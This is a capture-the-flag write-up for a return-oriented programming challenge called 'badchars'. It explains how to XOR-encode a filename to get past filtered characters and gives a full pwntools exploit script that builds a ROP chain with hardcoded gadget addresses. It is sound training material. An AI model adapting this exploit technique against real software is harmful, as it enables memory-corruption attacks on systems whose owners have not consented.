# Challenge Theory
This is a rop challenge, but the characters, "x", "g", "a", and "." will be replaced.
However, there is still a "print_file" function that will print out a file.
# Solution
The attacker needs to supply a string argument to the "print_file" function.
They also need to bypass the bad characters.
Bypassing the bad characters is easy with an included xor gadget included in the binary.
## Exploit Strategy
```
move xor'd flag into .data section of binary
xor flag to get original flag name
supply the address of the flag string as an argument to print_file
call print_file
```
## Solution Script
```python
#!/usr/bin/python3
import pwn
import sys
binary = "badchars"
pwn.context.binary = binary
pwn.context.encoding = "latin"

'''
for whatever reason, if the value is not 601030 the flag will not decode itself
it will be:
flag.tzt
not
flag.txt
'''

write_location = pwn.p64(0x601030)
write_location_value = 0x601030
bstring_flag = b"flag.txt"
bstring_flag_xor = pwn.xor(bstring_flag, 2)
gadget_pop_r12_r13_r14_r15 = pwn.p64(0x40069c)
gadget_mov_r13_r12 = pwn.p64(0x400634)
gadget_pop_r14_r15 = pwn.p64(0x4006a0)
gadget_xor_r15_r14 = pwn.p64(0x400628)
gadget_pop_rdi = pwn.p64(0x4006a3)
gadget_print_file = pwn.p64(0x400510)

combo_gadget_xor_flag = b""
for x in range(8):
    calculated_memory = write_location_value + x 
    combo_gadget_xor_flag += gadget_pop_r14_r15 + pwn.p64(2) + pwn.p64(calculated_memory) + gadget_xor_r15_r14

padding = 40
payload = pwn.flat(
    b"A"*padding,
    gadget_pop_r12_r13_r14_r15,
    bstring_flag_xor,
    write_location,
    0x00,
    0x00,
    gadget_mov_r13_r12,
    combo_gadget_xor_flag,
    gadget_pop_rdi,
    write_location,
    gadget_print_file
)

if ("input" in sys.argv):
    with open("input", "wb") as io:
        io.write(payload)

if ("log" in sys.argv):
    pwn.context.log_level = "debug"

with pwn.process(binary) as io:
    pwn.info(io.readrepeat(1))
    io.send(payload)

    if ("interactive" in sys.argv):
        io.interactive()

    if ("output" in sys.argv):
        pwn.info(io.readrepeat(1))
```